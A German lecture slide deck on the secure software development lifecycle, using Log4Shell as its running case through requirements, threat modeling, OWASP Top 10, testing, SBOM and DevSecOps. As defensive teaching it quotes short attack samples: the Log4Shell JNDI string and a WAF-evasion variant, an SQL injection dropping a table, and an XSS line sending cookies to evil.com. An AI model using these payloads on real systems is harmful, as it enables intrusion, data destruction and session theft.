---
marp: true
theme: custom
footer: ![w:280](img/dhbw-ka.svg)

---
<!-- _class: title -->
# Secure Software Development Lifecycle (SSDLC)

---

# Agenda

1. **Eröffnung:** Der Tag, an dem das Internet brannte – Log4Shell
2. **Grundlagen:** Vom SDLC zum SSDLC, Shift Left
3. **Planung:** Security Requirements, Abuse Cases, Compliance
4. **Design:** Security by Design, Threat Modeling, STRIDE
5. **Implementierung:** OWASP Top 10, Injection, XSS, Secrets
6. **Testing:** SAST, DAST, SCA, Code Review, Fuzzing
7. **Supply Chain:** Angriffsflächen & Software Bill of Materials (SBOM)
8. **DevSecOps:** CI/CD-Integration & Security Gates
9. **Deep Dive:** Log4Shell – Technischer Mechanismus
10. **Zusammenfassung & Diskussion**

---
<!-- _class: chapter -->

# Der Tag, an dem das Internet brannte

## Log4Shell – Dezember 2021

---

# 9. Dezember 2021

- Ein Sicherheitsforscher veröffentlicht Details zu **CVE-2021-44228**.
- **Betroffene Software:** Apache Log4j – eine Java-Logging-Bibliothek.
- **CVSS-Score:** **10.0** – das absolute Maximum.
- **Art:** Remote Code Execution (RCE) – beliebigen Code auf fremden Servern ausführen.

Innerhalb von **Stunden** beginnen automatisierte Scans das gesamte Internet abzusuchen.

> Die Schwachstelle wird schnell als **"Log4Shell"** bekannt.

---

# Warum war das so dramatisch?

Log4j ist keine exotische Nischensoftware, sondern eine **Grundkomponente der Java-Welt**:

- **Apple iCloud** – Millionen von Nutzerkonten
- **Amazon AWS** – Cloud-Infrastruktur für Millionen Unternehmen
- **Minecraft** – 140 Millionen aktive Spieler
- **Tesla** – Fahrzeugsoftware
- **Cisco, VMware, Twitter, LinkedIn** – Enterprise-IT weltweit

**Das Kernproblem:** Die meisten Unternehmen wussten nicht einmal, dass sie Log4j nutzen. Die Bibliothek steckte als *transitive Abhängigkeit* tief in ihren Software-Stacks.

---

# Der "Magic String"

Ein Angreifer musste lediglich folgenden Text an eine verwundbare Anwendung senden:

```
${jndi:ldap://angreifer-server.com/exploit}
```

- Eingefügt in ein **Login-Feld**, einen **Suchbegriff**, einen **HTTP-Header** – überall, wo die Eingabe geloggt wird.
- Log4j interpretiert den String, kontaktiert den Server des Angreifers und **führt dessen Code aus**.

> **Eine einzige Zeile Text** genügte, um einen Server vollständig zu kompromittieren.

---

# Die zentrale Frage

<style scoped>
blockquote { font-size: 1.4em; margin-top: 60px; }
</style>

> **"Warum wussten die meisten Unternehmen nicht einmal, dass sie Log4j verwenden – und wie hätte man das verhindern können?"**

Die Antwort auf diese Frage führt uns durch die gesamte heutige Vorlesung:

- Wir brauchen **Transparenz** über unsere Software-Bestandteile (→ SBOM).
- Wir brauchen **Systematik** in jeder Entwicklungsphase (→ SSDLC).
- Wir brauchen **Automatisierung** statt Hoffnung (→ DevSecOps).

---
<!-- _class: chapter -->

# Grundlagen

## Vom SDLC zum SSDLC

---

# Der klassische Software Development Lifecycle

<style scoped>
p { text-align: center; padding-top: 50px; }
</style>

![w:1200](img/sdlc.svg)

---

# Wo steckt die Sicherheit?

Im klassischen SDLC wird Sicherheit typischerweise **am Ende** adressiert:

- Ein **Penetration Test** kurz vor dem Release.
- Eine **Security Review** als letzter Gate-Keeper.
- **Ergebnis:** Schwachstellen werden spät entdeckt, Fixes sind teuer und riskant.

**Das Problem:**
- Architektur-Fehler lassen sich nachträglich kaum beheben.
- Zeitdruck vor dem Release führt zu "Akzeptiertem Risiko".
- Sicherheit wird als **Bremse** wahrgenommen, nicht als Qualitätsmerkmal.

---

# Das "Shift Left" Prinzip
## Die Ökonomie der Sicherheit


![w:580 center](img/shift_left_cost.svg)

**Fazit:** Sicherheit früh zu adressieren ist keine "Bremse", sondern eine Versicherungsprämie mit extrem hohem ROI.

---

# Was ist der SSDLC?

- **Definition:** Ein Framework, das Sicherheitsaktivitäten in **jede Phase** des SDLC integriert.
- **Kernaspekt:** Es geht nicht nur um Tools, sondern um **Kultur, Prozesse und Menschen**.
- **Ziel:** Schwachstellen systematisch reduzieren – von den Anforderungen bis zum Betrieb.

> **Traditionell:** Sicherheit als Checkpoint am Ende.
> **SSDLC:** Sicherheit als durchgängiger Begleiter.

---

# Der SSDLC im Überblick

Jede Phase des Entwicklungsprozesses hat dedizierte Security-Aktivitäten:

![w:750 center](img/ssdlc_phasen_overview.svg)

---

# Rückbezug: Log4Shell & Shift Left

Hätte man Log4Shell in verschiedenen Phasen adressiert:

| Phase | Mögliche Maßnahme | Kosten |
| :--- | :--- | :--- |
| **Requirements** | "Logging darf keinen Remote Code ausführen" | Minimal |
| **Design** | Trust Boundary zwischen Logger und Netzwerk | Gering |
| **Implementierung** | JNDI-Lookups standardmäßig deaktivieren | Moderat |
| **Testing (SCA)** | Verwundbare Log4j-Version erkennen | Moderat |
| **Produktion** | WAF-Regel, Incident Response, Patch | **Sehr hoch** |

> Je früher die Maßnahme, desto günstiger und effektiver.

---
<!-- _class: chapter -->

# Phase 1: Planung & Requirements

## Sicherheit beginnt vor der ersten Zeile Code

---

# Security Requirements

Funktionale Anforderungen beschreiben, was das System **tun soll**. Security Requirements beschreiben, was es **nicht tun darf**.

- **Vertraulichkeit:** "Passwörter dürfen nur als Hash gespeichert werden."
- **Integrität:** "Transaktionsbeträge müssen serverseitig validiert werden."
- **Verfügbarkeit:** "Das System muss 99,9% Uptime gewährleisten."
- **Compliance:** DSGVO, ISO 27001, PCI-DSS – je nach Branche und Datenart.

> **Merke:** Was nicht in den Anforderungen steht, wird nicht implementiert.

---

# Abuse Cases: Denken wie ein Angreifer
<!-- _class: big -->
Während ein **Use Case** beschreibt, wie ein System genutzt werden *soll*, beschreibt ein **Abuse Case** das bewusste Fehlverhalten.

**Vorgehen:**
1. Für jedes Feature fragen: *"Was könnte ein Angreifer damit tun?"*
2. Bedrohungsszenario formulieren: *"Als Angreifer möchte ich..."*
3. Gegenmaßnahme als Anforderung definieren.

---

# Abuse Cases: Denken wie ein Angreifer

| Use Case | Abuse Case | Gegenmaßnahme |
| :--- | :--- | :--- |
| Nutzer bezahlt 49,99 € | Angreifer sendet -49,99 € | Serverseitige Validierung: Betrag > 0 |
| Nutzer gibt Gutscheincode ein | Brute-Force aller Codes | Rate Limiting, CAPTCHA |
| Nutzer loggt sich ein | Credential Stuffing | MFA, Account-Lockout |

---
<!-- _class: big -->
# Risikoklassifizierung & Security Gates

Nicht jedes Feature braucht das gleiche Maß an Security-Aufwand:

- **High Risk:** Internet-Exposition, Zahlungsabwicklung, personenbezogene Daten (PII).
- **Medium Risk:** Interne Tools mit eingeschränktem Nutzerkreis.
- **Low Risk:** Statische Inhalte ohne Nutzereingaben.

---
<!-- _class: big -->
# Risikoklassifizierung & Security Gates

**Security Definition of Done – Checkliste:**
- Statische Analyse (SAST): Code gescannt, keine "High"-Findings offen.
- Abhängigkeiten (SCA): Alle Libraries auf sicherem Stand.
- Threat Model für das Feature aktualisiert.
- Peer Review mit explizitem Security-Fokus durchgeführt.

---

# Compliance & Regulatorik

Security ist oft keine Option, sondern eine **gesetzliche Pflicht**:

<style scoped>
table { font-size: 0.85em; }
</style>

| Standard | Fokus | Relevanz für SSDLC |
| :--- | :--- | :--- |
| **DSGVO** | Datenschutz (EU) | Privacy by Design, Löschkonzepte |
| **ISO 27001** | ISMS | Prozesssicherheit & Dokumentation |
| **PCI-DSS** | Zahlungsverkehr | Strikte Isolation von Kreditkartendaten |
| **NIS-2** | Kritische Infrastruktur (EU) | Meldepflichten, Supply-Chain-Sicherheit |
| **EU CRA** | Cyber Resilience Act | SBOM-Pflicht für Produkte mit digitalen Elementen |

> Compliance-Verstöße sind oft teurer als die Implementierung der Sicherheitsmaßnahmen.

---

# Rückbezug: Log4Shell & Requirements

**Welche Anforderung hätte Log4Shell verhindern können?**

- *"Die Logging-Komponente darf keine Netzwerkverbindungen zu externen Servern aufbauen."*
- *"Dynamische Auswertung von Log-Nachrichten (Lookups) ist standardmäßig deaktiviert."*
- *"Alle Drittanbieter-Bibliotheken müssen in einer SBOM erfasst und regelmäßig auf bekannte Schwachstellen geprüft werden."*

Diese Anforderungen existierten in keiner der betroffenen Organisationen.

> **Lektion:** Ohne explizite Security Requirements bleibt Sicherheit dem Zufall überlassen.

---
<!-- _class: chapter -->

# Phase 2: Design & Architektur

## Die Blaupause absichern

---

# Security by Design Prinzipien

- **Least Privilege:** Komponenten haben nur die minimal nötigen Rechte.
- **Defense in Depth:** Mehrstufige Verteidigung – nicht nur eine Firewall.
- **Secure Defaults:** Standardmäßig ist alles "zu", Funktionen müssen explizit aktiviert werden.
- **Fail Securely:** Wenn ein System abstürzt, darf es keine Backdoors öffnen.
- **Separation of Concerns:** Trennung von Authentifizierung, Autorisierung und Geschäftslogik.
- **Zero Trust:** Keiner Komponente vertrauen – auch nicht internen Diensten.

> **Log4Shell-Bezug:** Log4j verletzte "Secure Defaults" – JNDI-Lookups waren *standardmäßig aktiviert*.

---

# Threat Modeling

**Wann?** Immer wenn sich die Architektur ändert. Es ist die "Prüfung der Blaupause".

**Die 4 Kernfragen:**
1. **Was bauen wir?** → Diagramm erstellen (DFD)
2. **Was kann schiefgehen?** → Bedrohungen identifizieren (STRIDE)
3. **Was tun wir dagegen?** → Maßnahmen planen
4. **War das gut so?** → Validierung

**Tools:**
- **Microsoft Threat Modeling Tool:** Generiert automatisch STRIDE-Bedrohungen.
- **OWASP Threat Dragon:** Open Source, webbasiert.
- **draw.io / Excalidraw:** Flexibel für individuelle Diagramme.

---

# Datenflussdiagramme (DFD)

Um Bedrohungen zu finden, nutzen wir Abstraktionen:

- **Prozesse** (Kreise): Programmlogik, Cloud Functions.
- **Datenspeicher** (Parallele Linien): Datenbanken, S3-Buckets, Caches.
- **Externe Entitäten** (Rechtecke): Enduser, Drittanbieter-APIs.
- **Trust Boundaries** (Gepunktete Linien): Hier kreuzen Daten eine Vertrauenszone.

> Trust Boundaries sind die kritischen **Chokepoints** für Input-Validierung und Authentifizierung.

---

# DFD-Beispiel: Login-System

![w:820 center](img/dfd_login_example.svg)

---

# STRIDE – Systematische Bedrohungsanalyse

| Bedrohung | Schutzziel | Beispiel-Maßnahme |
| :--- | :--- | :--- |
| **S**poofing | Authentizität | MFA, TLS-Zertifikate |
| **T**ampering | Integrität | Digitale Signaturen, Hashes |
| **R**epudiation | Verbindlichkeit | Sicheres Logging, Audit-Trails |
| **I**nformation Disclosure | Vertraulichkeit | Verschlüsselung (AES), TLS |
| **D**enial of Service | Verfügbarkeit | Rate Limiting, Redundanz |
| **E**levation of Privilege | Autorisierung | RBAC, Role-Validation |

---

# STRIDE am Beispiel: Logging-Subsystem

Was passiert, wenn wir STRIDE auf **das Logging-System** anwenden – genau die Komponente, die bei Log4Shell versagte?

- **S:** Angreifer fälscht Log-Einträge, um Spuren zu verwischen.
- **T:** Manipulation von Log-Dateien, um Audit-Trails zu verfälschen.
- **R:** Fehlende Logs → Aktionen nicht nachvollziehbar.
- **I:** Sensitive Daten landen im Klartext in Log-Dateien (Passwörter, Tokens).
- **D:** Log-Flooding macht das SIEM unbrauchbar.
- **E:** **Log-Nachrichten lösen Code-Ausführung aus** → genau das ist Log4Shell!

> Hätte jemand STRIDE auf die Logging-Architektur angewendet, wäre "E" (Elevation of Privilege) sofort aufgefallen.

---
<!-- _class: chapter -->

# Phase 3: Implementierung

## Sicheren Code schreiben

---

# OWASP Top 10

Die OWSAP ist eine gemeinnützige Organisation, die sich der Verbesserung der Software-Sicherheit verschrieben hat. Ihre **Top 10** ist eine Liste der häufigsten und kritischsten Sicherheitsrisiken in Webanwendungen.

**Warum die OWASP Top 10 für den SSDLC essentiell ist:**

- Sie dienen als **Standard-Bedrohungsmodell** in der Designphase.
- Sie leiten **Anforderungen** in der Planungsphase ab.
- Sie bestimmen **Testfälle** in der Testing-Phase.
- Sie bilden die Grundlage für **Schulungsprogramme** und Security-Awareness.

> **Merke:** Jeder Entwickler sollte die OWASP Top 10 auswendig kennen – genauso wie "Null-Pointer Exceptions" oder "SQL Syntax" Teil des Handwerkszeugs sind.


---

# OWASP Top 10 

<style scoped>
table { font-size: 0.75em;}
</style>

| # | Kategorie | Kurzbeschreibung |
| :--- | :--- | :--- |
| A01 | **Broken Access Control** | Fehlende Zugriffskontrollen |
| A02 | **Cryptographic Failures** | Schwache oder fehlende Verschlüsselung |
| A03 | **Injection** | SQL, XSS, Command Injection |
| A04 | **Insecure Design** | Architektur-Schwächen, fehlende Threat Models |
| A05 | **Security Misconfiguration** | Default-Passwörter, offene Ports |
| A06 | **Vulnerable Components** | Bekannte CVEs in Libraries |
| A07 | **Auth. Failures** | Schwache Passwörter, Session-Fehler |
| A08 | **Data Integrity Failures** | Unsichere Deserialisierung |
| A09 | **Logging Failures** | Fehlende Angriffserkennung |
| A10 | **SSRF** | Server-Side Request Forgery |

---

# A01: Broken Access Control

- Nutzer können auf Funktionen oder Daten zugreifen, für die sie **keine Berechtigung** haben.
- Es fehlen serverseitige Prüfungen, ob der User die Aktion ausführen darf.

**Beispiel: Insecure Direct Object Reference (IDOR)**

Ein User sieht sein Profil unter: `https://example.com/api/v1/users/1234`

Der Angreifer ändert die ID: `https://example.com/api/v1/users/1235`

Wenn der Server nur prüft, ob der User *eingeloggt* ist, aber nicht, ob ihm die ID `1235` gehört → **Datenleck**.

**Lösung:** "Deny by default" + konsequente Ownership-Prüfung auf dem Server.

---

# A03: Injection – SQL Injection

Nicht vertrauenswürdige Daten werden an einen Interpreter gesendet. Der Interpreter kann **Daten nicht von Befehlen unterscheiden**.

**Verwundbarer Code:**
```
"SELECT * FROM products WHERE id = " + request.id
```

**Normaler Aufruf:** `id = 10`
→ `SELECT * FROM products WHERE id = 10` ✅

**Angriff:** `id = 10; DROP TABLE users`
→ `SELECT * FROM products WHERE id = 10; DROP TABLE users` ❌

---

# Prepared Statements – Der Goldstandard

Die SQL-Struktur wird **vorher** an die Datenbank gesendet. Der User-Input wird nur noch als reiner Textwert nachgereicht:

```java
// SICHER: Der Input wird niemals als Code ausgeführt
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, userInput);
ResultSet results = pstmt.executeQuery();
```

**Prinzip:** Strikte Trennung von **Befehlen** und **Daten**.

---

# A03: Cross-Site Scripting (XSS)

Angreifer schleust **JavaScript** in eine Webseite ein, das im Browser anderer Nutzer ausgeführt wird.

| Typ | Mechanismus | Persistenz |
| :--- | :--- | :--- |
| **Reflected** | Schadcode im URL-Parameter | Einmalig (per Link) |
| **Stored** | Schadcode in der DB (z. B. Forenbeitrag) | Dauerhaft |
| **DOM-based** | JavaScript manipuliert das DOM direkt | Clientseitig |

**Beispiel (Stored XSS) – ein Nutzer gibt als Anzeigename ein:**
```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

---

# A03: Cross-Site Scripting (XSS) - Gegenmaßnahmen

<style scoped>
table { font-size: 0.7em;}
</style>

| Maßnahme | Beschreibung | Beispiel |
| :--- | :--- | :--- |
| **Output Encoding** | Spezielle Zeichen in HTML-Entities umwandeln | `<` → `&lt;`, `"` → `&quot;` |
| **Content Security Policy (CSP)** | Whitelist erlaubter Script-Quellen | `script-src 'self'; object-src 'none'` |
| **Auto-Escaping Frameworks** | Templates escapen automatisch | React, Vue, Angular (default) |
| **Input Validation** | Nur erwartete Datentypen akzeptieren | Whitelist statt Blacklist |
| **HTTPOnly Cookies** | Cookies vor JavaScript-Zugriff schützen | Cookie-Flag `HttpOnly; Secure; SameSite` |
| **Sanitization Libraries** | HTML-Cleaning: erlaubte Tags beibehalten | DOMPurify, Bleach |
| **Subresource Integrity (SRI)** | Externe Scripts auf Integrität prüfen | `<script integrity="sha384-...">` |


---

# Hardcoded Secrets

Secrets sind Authentifizierungsdaten, die niemals öffentlich werden dürfen:

**Falsch – Hardcoded:**
```python
client = boto3.client('s3',
    aws_access_key_id='AKIAIOSFODNN7EXAMPLE',
    aws_secret_access_key='wJalrXUtnFEMI/K7MDENG')
```

**Richtig – Environment Variables:**
```python
client = boto3.client('s3',
    aws_access_key_id=os.getenv('AWS_ACCESS_KEY_ID'),
    aws_secret_access_key=os.getenv('AWS_SECRET_ACCESS_KEY'))
```

**Prävention:** GitLeaks, TruffleHog, Pre-Commit Hooks, GitHub Secret Scanning.

---

# Rückbezug: Log4Shell & Implementierung

Log4Shell ist ein Paradebeispiel für **A08: Software and Data Integrity Failures**:

- Log4j's JNDI-Lookup lädt **beliebige Java-Klassen von externen Servern**.
- Das ist funktional identisch mit **unsicherer Deserialisierung**: Daten werden zu Code.
- Die Funktion war ein *Feature*, kein Bug – aber ein Feature ohne Security-Bewertung.

**Lehre für die Implementierung:**
- Jede Funktion, die **externen Input interpretiert**, muss als potenzielle Schwachstelle betrachtet werden.
- "String Interpolation" in Log-Nachrichten klingt harmlos – ist aber eine Injection-Schwachstelle.

---
<!-- _class: chapter -->

# Phase 4: Testing & Verifikation

## Sicherheit automatisiert und manuell prüfen

---

# Die Security-Testing-Triade

Drei komplementäre Ansätze bilden das Fundament:

- **SAST (Static Application Security Testing)**
    White-Box: Scannt den **Quellcode** ohne Ausführung.
    *Findet:* Hardcoded Secrets, `eval()`, Injection-Muster.

- **DAST (Dynamic Application Security Testing)**
    Black-Box: Testet die **laufende Applikation** von außen.
    *Findet:* Konfigurationsfehler, Laufzeit-Schwachstellen.

- **SCA (Software Composition Analysis)**
    Scannt **Drittanbieter-Bibliotheken** auf bekannte CVEs.
    *Findet:* Verwundbare Abhängigkeiten (z. B. **Log4Shell!**).

---

# SAST, DAST, SCA im Vergleich

![w:920 center](img/sast_dast_sca_vergleich.svg)

---

# Wie funktionieren SAST-Tools?

- **Syntax-Analyse:** Prüfung auf unsichere Funktionen oder veraltete APIs.
- **Datenfluss-Analyse (Taint Analysis):** Verfolgt Daten von der Eingabe (Source) bis zur Verwendung (Sink) – findet Injection-Lücken.
- **Kontrollfluss-Analyse:** Untersucht logische Struktur auf unerreichbaren Code oder logische Fehler.

**Integration in die CI/CD-Pipeline:**
- **IDE-Plugins:** Feedback direkt beim Schreiben (VS Code, IntelliJ).
- **Commit-Stage:** Scan bei jedem `git push` oder Pull Request.
- **Quality Gates:** Build schlägt fehl bei kritischen Findings ("Break the Build").

**Herausforderung:** False Positives können zu "Alert Fatigue" führen.

---

# Code Reviews: Die menschliche Komponente

Automatisierte Tools finden vieles, aber nicht alles. **Menschliches Urteilsvermögen** erkennt:

- **Logikfehler:** Fehlende Autorisierungsprüfung nach Statuswechsel.
- **Business-Logik-Bugs:** Race Conditions bei Gutscheincodes.
- **Architektur-Schwächen**, die kein Scanner versteht.

**Security-fokussierte Review-Checkliste:**
- Werden alle Eingaben validiert und sanitized?
- Sind Autorisierungsprüfungen an **jeder** Stelle vorhanden?
- Gibt es Hardcoded Secrets oder Debug-Code?
- Werden Fehler sicher behandelt (keine Stack-Traces an User)?

---

# Fuzzing & Penetration Testing

**Fuzzing:** Automatisiertes Bombardieren mit zufälligen Eingaben.
- Findet Edge Cases, Crashes, Buffer Overflows.
- Google hat damit über 40.000 Bugs in Chrome gefunden.
- *Tools:* AFL, libFuzzer, Jazzer (Java).

**Penetration Testing:** Manuell + kreativ – ein Mensch denkt wie ein Angreifer.
1. **Reconnaissance:** Informationen sammeln.
2. **Scanning:** Automatisierte Schwachstellen-Scans.
3. **Exploitation:** Manuelle Ausnutzung.
4. **Reporting:** Dokumentation mit Risikobewertung.

**Bug Bounty Programme:** Externe Forscher werden bezahlt (HackerOne, Bugcrowd).

---

# Rückbezug: Log4Shell & Testing

**Welche Test-Methode hätte Log4Shell gefunden?**

| Methode | Hätte es gefunden? | Warum? |
| :--- | :--- | :--- |
| **SAST** | ❌ Nein | Das Problem liegt nicht im *eigenen* Code |
| **DAST** | ⚠️ Teilweise | Nur mit speziellen Payloads im Scan |
| **SCA** | ✅ **Ja!** | Erkennt die verwundbare Log4j-Version |
| **Code Review** | ❌ Nein | Die Schwachstelle steckt in einer Bibliothek |
| **Pen-Test** | ⚠️ Möglich | Erfahrene Tester prüfen auf JNDI-Payloads |

> **SCA war der entscheidende Hebel** – aber nur, wenn die verwundbare Abhängigkeit auch als solche bekannt und erfasst ist.

---
<!-- _class: chapter -->

# Die Software Supply Chain

## Die unsichtbare Angriffsfläche

---

# Moderne Software: Ein Ökosystem

Moderne Anwendungen bestehen zu **80-90% aus Open-Source-Komponenten**:

- **Proprietärer Code:** Eigenentwicklungen.
- **Open Source Libraries:** npm, PyPI, Maven – tausende Abhängigkeiten.
- **Build-Infrastruktur:** CI/CD-Pipelines, Compiler, Build-Server.
- **Drittanbieter-Tools:** Cloud-Dienste, IDE-Plugins.

> **Ein Angreifer muss nicht Ihr Hauptquartier hacken**, wenn er eine Bibliothek infizieren kann, die Sie (und tausende andere) blind vertrauen.

---

# Angriffsflächen der Supply Chain

![w:1000 center](img/supply_chain_attack_surface.svg)

---

# Typische Angriffsvektoren

- **Dependency Confusion:**
  Einschleusen bösartiger Pakete mit gleichem Namen in öffentliche Repositories.
  Eine interne Bibliothek `@company/utils` wird durch eine *öffentliche* `company-utils` ersetzt.

- **Typosquatting:**
  Pakete wie `requesst` statt `requests` – ein Tippfehler genügt.

- **Compromised Maintainer:**
  Übernahme von Maintainer-Accounts auf GitHub oder npm (`ua-parser-js`, 2021).

- **Build-Manipulation:**
  Backdoors werden während der Kompilierung eingefügt (SolarWinds, 2020).

---

# Fallbeispiel: SolarWinds (2020)

- **Was passierte?** Angreifer infiltrierten den Build-Prozess von SolarWinds Orion.
- **Wie?** Schadcode wurde automatisch bei der Kompilierung eingefügt – unsichtbar für Entwickler und Code Reviews.
- **Wer war betroffen?** 18.000 Kunden, darunter US-Regierungsbehörden, Microsoft, Intel.
- **Dauer:** Monate unentdeckt – der Schadcode kam als signiertes, legitimes Update.

**Lektion:** Selbst wenn Ihr eigener Code sicher ist – Ihre **Build-Pipeline** und **Ihre Abhängigkeiten** können kompromittiert sein.

---
<!-- _class: chapter -->

# Software Bill of Materials

## Die Zutatenliste für Software

---

# Was ist eine SBOM?

Eine **Software Bill of Materials** ist eine formale, strukturierte Liste aller Komponenten, Bibliotheken und Module in einer Software.

- **Analogie:** Wie die Zutatenliste auf einer Lebensmittelverpackung.
- **Zweck:** Transparenz – schnelle Identifizierung "giftiger" Bestandteile (Schwachstellen).
- **Formate:** SPDX (Linux Foundation), CycloneDX (OWASP).

**Regulatorische Verpflichtung:**
- **US Executive Order 14028** (2021): SBOM-Pflicht für Bundesbehörden-Lieferanten.
- **EU Cyber Resilience Act** (2024): SBOM-Pflicht für Produkte mit digitalen Elementen.

---

# Anatomie einer SBOM

Eine effektive SBOM beantwortet:

- **Was?** Name und Version jeder Komponente.
- **Woher?** Download URL, Repository, Package Registry.
- **Wer?** Autor oder Maintainer der Komponente.
- **Welche Abhängigkeiten?** Transitive Dependencies – Bibliotheken, die *unsere* Bibliotheken mitbringen.
- **Welche Lizenz?** Compliance-relevant (MIT, GPL, Apache).

---

# Anatomie einer SBOM - Beispiel

**Beispiel-Eintrag (CycloneDX, vereinfacht):**
```json
{
  "name": "log4j-core",
  "version": "2.14.1",
  "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1",
  "licenses": [{ "id": "Apache-2.0" }]
}
```

---

# Der SBOM-Lebenszyklus

![w:750 center](img/sbom_lifecycle.svg)

---

# SBOM + Log4Shell: Das Gedankenexperiment

**Szenario A: Firma ohne SBOM**
- Dezember 2021: CVE-2021-44228 wird veröffentlicht.
- IT-Abteilung: *"Nutzen wir Log4j? Wo? In welcher Version?"*
- Wochen intensiver manueller Suche in hunderten Systemen.
- Einige Systeme werden **vergessen**. Angreifer nutzen die Lücke.

---

# SBOM + Log4Shell: Das Gedankenexperiment

**Szenario B: Firma mit SBOM**
- Automatisierte Abfrage: `SELECT * FROM sbom WHERE component = 'log4j-core' AND version < '2.17.1'`
- **Ergebnis in Minuten:** Liste aller betroffenen Systeme mit Versionen.
- Priorisierte Patch-Reihenfolge nach Risiko.
- Vollständige Abdeckung – keine vergessenen Systeme.

> **Die SBOM war der Unterschied zwischen 3 Wochen Ungewissheit und 30 Minuten Klarheit.**

---

# SBOM: Best Practices

- **Automatisierung:** SBOMs müssen Teil der CI/CD-Pipeline sein – bei jedem Build erzeugt.
- **Monitoring:** Kontinuierlicher Abgleich der SBOM gegen CVE-Datenbanken (NVD, OSV).
- **Lieferanten fordern:** Keine Software von Drittanbietern ohne begleitende SBOM akzeptieren.
- **Transitive Abhängigkeiten:** Nicht nur die direkten `import`-Anweisungen, sondern den gesamten Dependency Tree erfassen.


---
<!-- _class: chapter -->

# DevSecOps

## Sicherheit in der CI/CD-Pipeline

---

# DevSecOps: Das Prinzip

**DevOps** vereint Entwicklung und Betrieb.
**DevSecOps** integriert Sicherheit als dritte Säule.

- Sicherheit ist **kein separates Team am Ende**, sondern Teil jedes Schritts.
- Automatisierte Security-Checks laufen bei **jedem Commit**.
- Schnelles Feedback an Entwickler statt dicker Berichte alle 6 Monate.

> **Ziel:** "Security as Code" – Sicherheitsrichtlinien als ausführbare, versionierte Policies.

---

# Container-Sicherheit: Ein DevSecOps-Fokus

## Offen: 
- Was sind Containers? – leichtgewichtige, isolierte Laufzeitumgebungen.
- Warum sind sie so beliebt? – Portabilität, Skalierbarkeit, Microservices.
- Warum sind sie eine Herausforderung für die Sicherheit? – Neue Angriffsflächen, komplexe Ökosysteme.

---

# Container-Sicherheit: Ein DevSecOps-Fokus


- **Build-Phase:** Scannen von Basis-Images auf bekannte CVEs (Trivy, Clair).
- **Runtime-Phase:** Überwachung von Container-Verhalten (Falco, Sysdig).
- **Orchestrierung:** Kubernetes-Sicherheitsrichtlinien (OPA/Gatekeeper). 
- **Supply Chain:** Signieren von Images (Notary, Cosign) und Verifizieren vor dem Deployment.
- **Incident Response:** Automatisierte Isolation kompromittierter Container, Rollback-Mechanismen.

---

# Die DevSecOps Pipeline

![w:1100 center](img/devsecops_pipeline.svg)

---

# Integration: Werkzeuge pro Pipeline-Phase

| Pipeline-Phase | Security-Tool | Prüfung |
| :--- | :--- | :--- |
| **Commit** | GitLeaks, Pre-Commit Hooks | Secrets im Code? |
| **Build** | SAST (Semgrep, SonarQube) | Unsichere Code-Patterns? |
| **Dependencies** | SCA (Snyk, Dependabot) + SBOM | Verwundbare Libraries? |
| **Test** | DAST (OWASP ZAP) | Laufzeit-Schwachstellen? |
| **Container** | Trivy, Checkov | Image-Vulnerabilities? |
| **Deploy** | IaC-Scanning (tfsec) | Fehlkonfigurationen? |
| **Monitor** | SIEM, WAF | Angriffe im Betrieb? |

---

# Quality Gates & Secure Deployment

**Quality Gates:** Build schlägt fehl bei:
- Kritischen SAST-Findings (Severity: High/Critical).
- Verwundbaren Abhängigkeiten ohne bekannten Fix.
- Container-Images mit bekannten CVEs in der Basis.

**Container-Hardening:**
- Minimale Base Images (z. B. `alpine` statt `ubuntu`).
- Container niemals als `root` laufen lassen.
- Read-Only Filesystems wo möglich.

---
<!-- _class: chapter -->

# Deep Dive: Log4Shell

## Der technische Mechanismus

---

# Was ist Log4j?

- **Apache Log4j:** Eine Open-Source-Logging-Bibliothek für Java.
- **Zweck:** Textnachrichten über den Status einer Anwendung speichern.

```java
// Standard-Logging – harmlos
logger.info("Benutzer {} hat sich eingeloggt", username);
```

- **Verbreitung:** Nahezu überall in der Enterprise-Java-Welt.
- Ein einziger Befehl kann Log4j als *transitive Abhängigkeit* einbinden – ohne dass der Entwickler es direkt sieht.

---

# Die Schwachstelle: JNDI Lookups

Log4j besitzt ein Feature namens **"Lookups"** – dynamische Variablenersetzung in Log-Nachrichten:

- **Standard-Lookup:** `${java:version}` → wird zu "Java version 1.8.0".
- **Environment:** `${env:USER}` → wird zum System-Usernamen.
- **Der gefährliche Lookup:** `${jndi:ldap://...}` →
  **Java Naming and Directory Interface** kontaktiert einen **externen Server**.

**JNDI** ermöglicht es Java-Anwendungen, Objekte über Protokolle wie **LDAP** oder **RMI** von Netzwerkservern zu laden.

> Aus einer harmlosen "String-Interpolation" wird eine **Remote Code Execution**.

---

# Die Angriffskette

![w:800 center](img/log4shell_chain.svg)

---

# Der Angriffsvektor im Detail

**Schritt 1:** Angreifer sendet einen HTTP-Request:

```http
GET / HTTP/1.1
Host: opfer-server.de
User-Agent: ${jndi:ldap://angreifer.com/exploit}
```

<br>

**Schritt 2:** Die Anwendung loggt den User-Agent:
```java
logger.info("Request von: " + request.getHeader("User-Agent"));
```

---

# Der Angriffsvektor im Detail

**Schritt 3:** Log4j erkennt `${jndi:...}`, baut eine LDAP-Verbindung auf.

**Schritt 4:** Der LDAP-Server des Angreifers antwortet mit einer Referenz auf eine Java-Klasse.

**Schritt 5:** Log4j lädt die Klasse und **führt sie aus** → vollständige Kontrolle über den Server.

---

# Warum war es so verheerend?

| Faktor | Auswirkung |
| :--- | :--- |
| **Einfachheit** | Keine komplexen Exploits nötig – ein einziger String reicht |
| **Reichweite** | Von iCloud über Minecraft bis zu internen Bankensystemen |
| **Blind Spots** | Viele Firmen wussten nicht, dass sie Log4j nutzen |
| **Transitivität** | Log4j steckte oft 3-4 Ebenen tief im Dependency Tree |
| **Nachgelagerte Systeme** | Ein Log-Eintrag wandert durch viele Systeme, bevor er "explodiert" |

---

# Mitigation: Wie wurde reagiert?

**1. Patch (langfristig):**
- Update auf Log4j **Version 2.17.1** oder neuer.
- JNDI-Lookups standardmäßig deaktiviert, Remote-Code-Laden entfernt.

**2. Konfiguration (Quick Fix):**
- `log4j2.formatMsgNoLookups=true` – deaktiviert Lookups.

---

# Mitigation: Wie wurde reagiert?

**3. WAF-Regeln (sofort):**
- Blockierung von Requests, die `${jndi:` enthalten.
- Problem: Angreifer nutzen schnell Evasion-Techniken (z. B. `${${lower:j}ndi:...}`).

